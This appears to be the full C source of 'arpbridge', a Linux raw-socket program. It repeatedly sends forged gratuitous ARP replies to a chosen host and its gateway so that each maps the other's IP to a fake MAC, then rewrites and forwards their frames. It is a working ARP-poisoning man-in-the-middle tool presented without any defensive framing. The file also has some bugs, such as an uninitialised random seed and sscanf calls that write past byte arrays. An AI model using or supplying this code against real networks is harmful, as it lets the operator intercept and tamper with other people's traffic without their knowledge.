#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/sockios.h>
#include <net/if.h>
#include <netinet/in.h>

/* Our network-socket */
int sock = -1;
struct sockaddr_ll sa;

uint8_t virtualMac [6] = "\x02\x00\x00\x00\x00\x00";
uint8_t remoteMac [6]  = "\x00\x00\x00\x00\x00\x00";
uint8_t gatewayMac [6] = "\x00\x00\x00\x00\x00\x00";
uint8_t remoteIP [4]   = { 0, 0, 0, 0 };
uint8_t gatewayIP [4]  = { 0, 0, 0, 0 };
char *interface        = "eth0";

// {{{ sendPacket
/**
 * Write out a raw ethernet-frame to socket
 * 
 * @param char *packet
 * @param size_t length
 * 
 * @access public
 * @return void
 **/
#define sendPacket(packet, length) \
  if (sendto (sock, packet, length, 0, (struct sockaddr *)&sa, sizeof (sa)) == -1) \
    perror ("sendto");
// }}}

// {{{ sendGARP
/**
 * Write out a gratious ARP-Reply
 * 
 * @param char *fromMAC
 * @param char *toMAC
 * @param uint32_t fromIP
 * @param uint32_t toIP
 * 
 * @access public
 * @return void
 **/
void sendGARP (uint8_t *fromMAC, uint8_t *toMAC, uint8_t *fromIP, uint8_t *toIP) {
  char packet [42] =
    "\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00"
    "\x08\x06\x00\x01\x08\x00"
    "\x06\x04\x00\x02\x00\x00"
    "\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00";
  
  char *p = (char *)&packet;
  
  // Change ethernet-header
  memcpy (p, toMAC, 6);
  memcpy (p + 6, fromMAC, 6);
  
  // Change ARP-Addresses
  memcpy (p + 22, fromMAC, 6);
  memcpy (p + 28, fromIP, 4);
  memcpy (p + 32, toMAC, 6);
  memcpy (p + 38, toIP, 4);
  
  // Send out the packet
  sendPacket (packet, 42);
}
// }}}

// {{{ renew
/**
 * Singal-Handler: Resend our gratious ARP
 * 
 * @param int sig (unused)
 * 
 * @access public
 * @return void
 **/
void renew (int sig) {
  // Tell gateway and remote about us
  sendGARP (virtualMac, remoteMac, gatewayIP, remoteIP);
  sendGARP (virtualMac, gatewayMac, remoteIP, gatewayIP);
  
  // Do it again in future
  alarm (10);
}
// }}}

// {{{ cleanup
/**
 * Signal-Handler: Clean up and exit
 * 
 * @param int sig (unused)
 * 
 * @access public
 * @return void
 **/
void cleanup (int sig) {
  // Restore all ARP-Bindings
  sendGARP (gatewayMac, remoteMac, gatewayIP, remoteIP);
  sendGARP (remoteMac, gatewayMac, remoteIP, gatewayIP);
  
  // Do a clean exit
  exit (0);
}
// }}}

// {{{ usage
/**
 * Print usage and exit
 * 
 * @access public
 * @return void
 **/
void usage () {
  fprintf (stderr, "Usage: arpbridge [-i interface] [-b bridge-mac] remote-mac gateway-mac remote-ip gateway-ip\n");
  exit (1);
}
// }}}

// {{{ getMAC
/**
 * Read a MAC-address from human input
 * 
 * @param uint8_t *dest
 * @param char *src
 * 
 * @access public
 * @return void
 **/
void getMAC (uint8_t *dest, char *src) {
  if (sscanf (src, "%02hx:%02hx:%02hx:%02hx:%02hx:%02hx", dest, dest + 1, dest + 2, dest + 3, dest + 4, dest + 5) == 6)
    return;
  
  fprintf (stderr, "Invalid MAC: %s\n", src);
  exit (1);
}
// }}}

// {{{ getIP
/**
 * Read an IP-address from human input
 * 
 * @param uint8_t *ip
 * @param char *src
 * 
 * @access public
 * @return void
 **/
void getIP (uint8_t *ip, char *src) {
  if (sscanf (src, "%hu.%hu.%hu.%hu", ip, ip + 1, ip + 2, ip + 3) == 4)
    return;
  
  fprintf (stderr, "Invalid IP: %s\n", src);
  exit (1);
}
// }}}

// {{{ main
/**
 * Main-Program
 * 
 * @access public
 * @return int
 **/
int main (int argc, char *argv[]) {
  int c;
  fd_set rfds;
  struct timeval tv;
  struct ifreq ifr;
  
  // Parse arguments
  c = rand_r (&c);
  memcpy (virtualMac + 2, &c, 4);
  
  while ((c = getopt (argc, argv, "b:i:h?VVVV")) != -1) {
    switch (c) {
      case 'i':
        interface = strdup (optarg);
        break;
      case 'b':
        getMAC (virtualMac, optarg);
        break;
      case 'h':
      default:
        usage ();
    }
  }
  
  argc -= optind;
  argv += optind;
  
  if (argc != 4)
    usage ();
  
  getMAC (remoteMac, argv [0]);
  getMAC (gatewayMac, argv [1]);
  getIP ((uint8_t *)&remoteIP, argv [2]);
  getIP ((uint8_t *)&gatewayIP, argv [3]);
  
  fprintf (stderr, "Interface:   %s\n", interface);
  fprintf (stderr, "Remote MAC:  %02x:%02x:%02x:%02x:%02x:%02x\n", remoteMac [0], remoteMac [1], remoteMac [2], remoteMac [3], remoteMac [4], remoteMac [5]);
  fprintf (stderr, "Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", gatewayMac [0], gatewayMac [1], gatewayMac [2], gatewayMac [3], gatewayMac [4], gatewayMac [5]);
  fprintf (stderr, "Virtual MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", virtualMac [0], virtualMac [1], virtualMac [2], virtualMac [3], virtualMac [4], virtualMac [5]);
  fprintf (stderr, "Remote IP:   %u.%u.%u.%u\n", remoteIP [0], remoteIP [1], remoteIP [2], remoteIP [3]);
  fprintf (stderr, "Gateway IP:  %u.%u.%u.%u\n", gatewayIP [0], gatewayIP [1], gatewayIP [2], gatewayIP [3]);
  
  // Prepare the I/O
  memset (&sa, 0, sizeof (sa));
  sa.sll_family    = AF_PACKET;
  sa.sll_protocol  = htons (ETH_P_ALL);
  
  // Create listener
  if ((sock = socket (PF_PACKET, SOCK_RAW, sa.sll_protocol)) < 0) {
    perror ("socket");
    
    return errno;
  }
  
  // Retrive index of our interface
  memset ((void *)&ifr, 0, sizeof (ifr));
  strncpy (ifr.ifr_name, interface, strlen (interface));
  
  if (ioctl (sock, SIOCGIFINDEX, &ifr) < 0) {
    perror ("get ifindex");
    exit (1);
  } else
    sa.sll_ifindex = ifr.ifr_ifindex;
  
  // Setup signal-handlers
  signal (SIGALRM, renew);
  signal (SIGHUP, cleanup);
  signal (SIGINT, cleanup);
  signal (SIGTERM, cleanup);
  
  // Make sure ARP-Cache is flushed
  renew (SIGALRM);
  
  // Main-loop
  for (;;) {
    // Wait for incoming packet
    FD_ZERO (&rfds);
    FD_SET (sock, &rfds);
    
    tv.tv_sec = 60;
    tv.tv_usec = 0;
    
    if (select (sock + 1, &rfds, NULL, NULL, &tv) < 1)
      continue;
    
    if (!FD_ISSET (sock, &rfds))
      continue;
    
    // Read the packet
    char buf[1501];
    size_t length;
    
    length = read (sock, &buf, sizeof (buf));
    
    // Capture traffic gateway->remote
    uint8_t *to = (uint8_t *)buf;
    uint8_t *from = to + 6;
    
    if ((memcmp (to, virtualMac, 6) == 0) &&
        (memcmp (from, gatewayMac, 6) == 0)) {
      // Rewrite
      memcpy (from, virtualMac, 6);
      memcpy (to, remoteMac, 6);
      
      // Forward
      sendPacket (buf, length);
    // Capture traffic remote->gateway
    } else if ((memcmp (to, virtualMac, 6) == 0) &&  
               (memcmp (from, remoteMac, 6) == 0)) {
      // Rewrite
      memcpy (from, virtualMac, 6);
      memcpy (to, gatewayMac, 6);
      
      // Forward
      sendPacket (buf, length);
    }
  }
  
  return 0;
}
// }}}
